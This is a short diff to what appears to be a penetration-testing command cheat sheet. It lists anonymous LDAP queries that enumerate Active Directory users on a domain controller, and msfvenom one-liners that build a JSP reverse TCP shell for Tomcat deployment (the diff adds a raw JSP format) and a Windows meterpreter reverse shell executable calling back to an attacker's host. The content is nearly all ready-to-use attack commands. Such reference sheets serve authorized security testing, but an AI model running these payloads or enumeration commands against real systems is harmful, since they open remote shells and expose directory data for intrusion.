@@ -49,8 +49,8 @@ ldapsearch -x -H ldap://<dc-ip> -b '' -s base '(objectclass=*)'
 # ldapsearch raw raw AD users from DC anonymously
 ldapsearch -x -H ldap://<dc-ip> -b 'DC=<domain>,DC=<domain-suffix>' '(objectClass=person)'
 
-# msfvenom generate java tcp reverse shell with file format war for tomcat deployment
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war
+# msfvenom generate java tcp reverse shell with file format war or jsp (raw) for tomcat deployment
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f [war|raw]
 
 # msfvenom generate meterpreter with file format exe for windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe
